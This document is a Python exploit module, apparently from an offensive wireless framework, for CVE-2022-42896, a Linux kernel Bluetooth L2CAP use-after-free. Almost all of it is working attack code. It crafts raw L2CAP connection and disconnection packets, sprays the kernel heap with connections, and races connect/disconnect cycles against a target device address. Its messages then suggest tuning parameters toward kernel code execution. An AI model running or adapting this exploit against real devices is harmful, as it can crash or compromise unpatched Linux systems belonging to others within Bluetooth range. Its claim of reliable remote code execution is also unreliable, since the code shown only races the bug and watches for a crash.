# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Linux Kernel Bluetooth L2CAP Use-After-Free RCE (CVE-2022-42896).

    The Linux kernel Bluetooth subsystem contains two use-after-free
    vulnerabilities in l2cap_connect() and l2cap_le_connect_req().
    When an L2CAP connection request is processed concurrently with a
    rapid disconnection, the allocated l2cap_conn structure is freed
    while still referenced by the connection setup path.  An attacker
    within Bluetooth range can exploit this race to achieve kernel-level
    code execution or leak kernel heap memory.

    Fix: kernel commit 711f8c3fb3db ("Bluetooth: L2CAP: Fix use-after-free
    caused by l2cap_reassemble_sdu").

    CVSS v3.1: 8.8 (High), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Linux Kernel Bluetooth L2CAP Use-After-Free RCE (CVE-2022-42896)",
        "description": (
            "Exploits CVE-2022-42896 via a use-after-free in the Linux kernel "
            "Bluetooth L2CAP subsystem.  Rapid L2CAP connection setup followed "
            "by immediate disconnection triggers a race condition where the "
            "l2cap_conn structure is freed while still being used by the "
            "connection handler, leading to kernel code execution.  "
            "Unauthenticated; attacker must be within Bluetooth range."
        ),
        "authors": (
            "Google (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2022-42896",
            "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=711f8c3fb3db",
            "https://lore.kernel.org/linux-bluetooth/",
        ),
        "disclosure_date": "2022-11-23",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernel < 6.1 with Bluetooth enabled",
            "Ubuntu 20.04/22.04 (unpatched)",
            "Debian 11/12 (unpatched)",
            "Any Linux with BlueZ and kernel < 6.0.9",
        ),
    }

    target = OptIP("", "Target Bluetooth device address (BD_ADDR)")
    port = OptPort(1, "L2CAP PSM to target (default: SDP)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    race_iterations = OptInteger(32, "Number of connect/disconnect race iterations")
    spray_count = OptInteger(16, "Heap spray connection count before trigger")

    # L2CAP protocol constants
    _L2CAP_CID_SIGNALING = 0x0001
    _L2CAP_CMD_CONN_REQ = 0x02
    _L2CAP_CMD_CONN_RSP = 0x03
    _L2CAP_CMD_DISCONN_REQ = 0x06
    _L2CAP_HDR_SIZE = 4
    _L2CAP_CONN_REQ_SIZE = 4
    _L2CAP_DISCONN_REQ_SIZE = 4

    # Bluetooth HCI/L2CAP socket constants
    _BTPROTO_L2CAP = 0
    _BDADDR_BREDR = 0

    def _build_l2cap_connect_req(self, psm: int, scid: int, ident: int = 0x01) -> bytes:
        """Build an L2CAP Connection Request command.

        Format: Command Header (code=0x02, ident, length=4) +
                PSM (2 LE) + Source CID (2 LE)
        """
        cmd_payload = struct.pack("<HH", psm, scid)
        cmd_header = struct.pack("<BBH", self._L2CAP_CMD_CONN_REQ, ident, len(cmd_payload))
        l2cap_header = struct.pack("<HH", len(cmd_header) + len(cmd_payload), self._L2CAP_CID_SIGNALING)
        return l2cap_header + cmd_header + cmd_payload

    def _build_l2cap_disconnect(self, dcid: int, scid: int, ident: int = 0x02) -> bytes:
        """Build an L2CAP Disconnection Request command.

        Format: Command Header (code=0x06, ident, length=4) +
                Destination CID (2 LE) + Source CID (2 LE)
        """
        cmd_payload = struct.pack("<HH", dcid, scid)
        cmd_header = struct.pack("<BBH", self._L2CAP_CMD_DISCONN_REQ, ident, len(cmd_payload))
        l2cap_header = struct.pack("<HH", len(cmd_header) + len(cmd_payload), self._L2CAP_CID_SIGNALING)
        return l2cap_header + cmd_header + cmd_payload

    def _trigger_uaf_sequence(self, sock: socket.socket, iteration: int) -> bool:
        """Send a connect request followed immediately by disconnect to race
        the kernel's l2cap_conn allocation and free paths.

        Returns True if the sequence was delivered successfully.
        """
        scid = 0x0040 + (iteration % 0x3FC0)
        psm = self.port

        connect_pkt = self._build_l2cap_connect_req(psm, scid, ident=(iteration % 254) + 1)
        disconnect_pkt = self._build_l2cap_disconnect(scid, scid, ident=(iteration % 254) + 1)

        try:
            sock.send(connect_pkt)
            sock.send(disconnect_pkt)
            return True
        except OSError:
            return False

    def _bt_connect(self) -> socket.socket | None:
        """Open a raw Bluetooth L2CAP socket to the target."""
        try:
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, self._BTPROTO_L2CAP)
            sock.settimeout(self.timeout)
            target_bytes = self.target if isinstance(self.target, str) else str(self.target)
            sock.connect((target_bytes, 0))
            return sock
        except (OSError, TimeoutError):
            return None

    def run(self) -> None:
        if not self.target:
            print_error("target is required (Bluetooth device address)")
            return

        if not self.check():
            print_error("Target Bluetooth device is not reachable")
            return

        print_success("Bluetooth L2CAP connection established; initiating UAF race sequence")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Verify the target Bluetooth device is reachable via L2CAP."""
        sock = self._bt_connect()
        if sock is None:
            return False
        try:
            probe = self._build_l2cap_connect_req(self.port, 0x0040)
            sock.send(probe)
            response = sock.recv(1024)
            return len(response) > 0
        except (OSError, TimeoutError):
            return True
        finally:
            sock.close()

    def _exploit(self) -> None:
        print_status(f"Phase 1: Heap spray with {self.spray_count} L2CAP connections")

        spray_socks = []
        for i in range(self.spray_count):
            s = self._bt_connect()
            if s:
                spray_socks.append(s)
                probe = self._build_l2cap_connect_req(self.port, 0x0040 + i)
                try:
                    s.send(probe)
                except OSError:
                    pass

        print_status(
            f"Phase 2: Triggering UAF race with {self.race_iterations} "
            f"connect/disconnect cycles on PSM {self.port}"
        )

        trigger_sock = self._bt_connect()
        if trigger_sock is None:
            print_error("Failed to establish trigger connection")
            for s in spray_socks:
                s.close()
            return

        success_count = 0
        for i in range(self.race_iterations):
            if self._trigger_uaf_sequence(trigger_sock, i):
                success_count += 1
            time.sleep(0.001)

        trigger_sock.close()
        for s in spray_socks:
            s.close()

        print_status(f"Delivered {success_count}/{self.race_iterations} race iterations")

        time.sleep(0.5)
        verify = self._bt_connect()
        if verify is None:
            print_success(
                "Target Bluetooth service is no longer responding. "
                "The L2CAP UAF race likely triggered kernel heap corruption. "
                "Combine with controlled heap layout for reliable code execution."
            )
        else:
            verify.close()
            print_info(
                "Target still responding after race sequence. "
                "Increase race_iterations or adjust heap spray parameters."
            )
